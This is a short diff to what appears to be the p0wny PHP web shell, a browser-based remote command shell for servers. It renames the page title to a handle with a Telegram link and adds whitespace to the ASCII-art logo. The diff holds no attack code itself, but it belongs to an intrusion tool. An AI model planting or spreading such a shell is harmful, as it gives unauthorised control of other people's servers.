@@ -191,7 +191,7 @@ if (isset($_GET["feature"])) {
 
     <head>
         <meta charset="UTF-8" />
-        <title>p0wny@shell:~#</title>
+        <title>h3xag0n@https://t.me/hex_array:~#</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <style>
             html, body {
@@ -586,6 +586,8 @@ if (isset($_GET["feature"])) {
             <pre id="shell-content">
                 <div id="shell-logo">
                   <p>
+
+                      
                ...
              ;::::;
            ;::::; :;
@@ -606,7 +608,9 @@ if (isset($_GET["feature"])) {
  ::::`:::::::`;::::::::;:::#                OO
  `:::::`::::::::::::;'`:;::#                O
   `:::::`::::::::;' /  / `:#
-   ::::::`:::::;'  /  /   `#</p>
+   ::::::`:::::;'  /  /   `#
+                      
+                  </p>
                 </div>
             </pre>
             <div id="shell-input">
